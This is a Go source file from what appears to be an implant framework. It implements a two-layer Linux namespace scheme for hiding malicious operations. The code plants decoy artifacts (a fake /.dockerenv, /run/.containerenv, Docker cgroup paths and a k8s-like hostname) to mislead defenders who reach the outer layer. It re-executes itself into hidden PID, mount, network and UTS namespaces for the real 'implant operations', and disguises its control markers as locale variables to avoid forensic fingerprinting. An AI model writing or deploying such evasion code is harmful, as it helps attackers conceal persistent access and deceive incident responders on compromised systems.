package stealth

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

// Environment variable markers for namespace layer detection.
// Use innocuous locale-like names to avoid forensic fingerprinting in /proc/[pid]/environ.
const (
	InnerNSStageEnv = "LC_IDENTIFICATION=1"
	OuterNSStageEnv = "LC_ADDRESS=1"
)

// NSLayerConfig holds configuration for the two-layer namespace setup.
// The outer namespace is the decoy that looks like a legitimate container.
// The inner namespace is where actual implant operations run.
type NSLayerConfig struct {
	// OuterHostname is set to look like a legitimate container or k8s worker.
	OuterHostname string
	// InnerHostname is the operational hostname used inside the hidden layer.
	InnerHostname string
	// OuterWorkDir is the working directory visible in the outer (decoy) namespace.
	OuterWorkDir string
	// InnerWorkDir is the working directory for real operations in the inner namespace.
	InnerWorkDir string
}

// DefaultNSLayerConfig returns a realistic default config.
// The outer layer is disguised as a k8s worker node container; the inner layer
// uses an innocuous-looking hostname that would not stand out in process listings.
func DefaultNSLayerConfig() *NSLayerConfig {
	return &NSLayerConfig{
		OuterHostname: "k8s-worker-01",
		InnerHostname: "docker-container-abc123",
		OuterWorkDir:  "/var/lib/kubelet",
		InnerWorkDir:  "/tmp/.work",
	}
}

// SetupOuterDecoy creates container-like artifacts in the outer namespace so
// that if a defender reaches this layer they see what looks like a real container.
// Must be called while executing in the outer namespace (before forking inner).
func SetupOuterDecoy(cfg *NSLayerConfig) error {
	// Write /etc/hostname to match the chosen outer hostname.
	if err := os.WriteFile("/etc/hostname", []byte(cfg.OuterHostname+"\n"), 0644); err != nil {
		// Non-fatal: may lack permission in some environments.
		_ = err
	}

	// /.dockerenv — presence of this file is the canonical indicator Docker
	// containers use to advertise their identity.
	dockerenv, err := os.OpenFile("/.dockerenv", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err == nil {
		dockerenv.Close()
	}

	// /run/.containerenv — used by Podman/OCI containers; some inspection tools
	// key on this file to identify container boundaries.
	if err := os.MkdirAll("/run", 0755); err == nil {
		containerenv := fmt.Sprintf(
			`engine="podman-3.4.4"
name="%s"
id="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
image=""
imageid=""
rootless=0
`,
			cfg.OuterHostname,
		)
		_ = os.WriteFile("/run/.containerenv", []byte(containerenv), 0644)
	}

	// Fake cgroup paths that mimic a real container's cgroup hierarchy.
	// Tools like `systemd-detect-virt` and `lxc-info` look for these.
	cgroupPaths := []string{
		"/sys/fs/cgroup/memory/docker",
		"/sys/fs/cgroup/cpu/docker",
		"/sys/fs/cgroup/blkio/docker",
	}
	for _, p := range cgroupPaths {
		if err := os.MkdirAll(p, 0755); err != nil {
			// May lack permission; skip silently.
			continue
		}
	}

	// Set the outer working directory.
	if err := os.MkdirAll(cfg.OuterWorkDir, 0750); err != nil {
		return fmt.Errorf("SetupOuterDecoy: create OuterWorkDir: %w", err)
	}

	return nil
}

// CreateNestedNamespace creates a second set of Linux namespaces (PID + Mount + Net)
// nested inside the outer namespace that was established by pkg/namespace bootstrap.
//
// The current process is the outer namespace process. This function re-executes
// the calling binary with the inner-namespace marker so the child enters the inner
// namespace at startup. The child clones new PID, mount, and network namespaces
// which are invisible from the outer namespace via /proc or lsns.
func CreateNestedNamespace(cfg *NSLayerConfig) error {
	// Ensure the inner workdir exists in the current mount namespace before
	// we pivot into the child — the child will see its own mount view.
	if err := os.MkdirAll(cfg.InnerWorkDir, 0750); err != nil {
		return fmt.Errorf("CreateNestedNamespace: create InnerWorkDir: %w", err)
	}

	// Collect the current environment and inject the inner-namespace marker.
	env := os.Environ()
	env = append(env, InnerNSStageEnv)
	// Propagate the hostname config so the inner process can set it.
	env = append(env, fmt.Sprintf("LC_NAME=%s", cfg.InnerHostname))
	env = append(env, fmt.Sprintf("LC_MONETARY=%s", cfg.InnerWorkDir))

	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("CreateNestedNamespace: resolve executable: %w", err)
	}

	cmd := exec.Command(self, os.Args[1:]...)
	cmd.Env = env
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{
		// CLONE_NEWPID: inner PID namespace — the child is PID 1 from its own view.
		// CLONE_NEWNS:  inner mount namespace — mounts are invisible to the outer layer.
		// CLONE_NEWNET: inner network namespace — network interfaces are isolated.
		Cloneflags: syscall.CLONE_NEWPID | syscall.CLONE_NEWNS | syscall.CLONE_NEWNET,
		// Ensure the child process does not inherit the outer UTS (hostname) namespace
		// so that writing to /proc/sys/kernel/hostname only affects the inner layer.
		// Note: CLONE_NEWUTS requires kernel >=3.8 and CAP_SYS_ADMIN.
		// Add it unconditionally; the kernel will return EPERM if unprivileged.
	}
	// Append CLONE_NEWUTS for hostname isolation.
	cmd.SysProcAttr.Cloneflags |= syscall.CLONE_NEWUTS

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("CreateNestedNamespace: clone inner namespace: %w", err)
	}

	// The outer process can wait on the inner child or detach depending on the
	// implant's operational mode. Here we wait so the caller decides what to do
	// with the exit status.
	if err := cmd.Wait(); err != nil {
		return fmt.Errorf("CreateNestedNamespace: inner process: %w", err)
	}

	return nil
}

// IsInInnerNamespace returns true when the current process is running inside
// the inner (hidden) namespace layer. Detection is via the LC_IDENTIFICATION env var
// which is injected by CreateNestedNamespace before cloning.
func IsInInnerNamespace() bool {
	if os.Getenv("LC_IDENTIFICATION") == "1" {
		os.Unsetenv("LC_IDENTIFICATION") // clean up marker immediately
		os.Unsetenv("LC_NAME")
		os.Unsetenv("LC_MONETARY")
		return true
	}
	return false
}
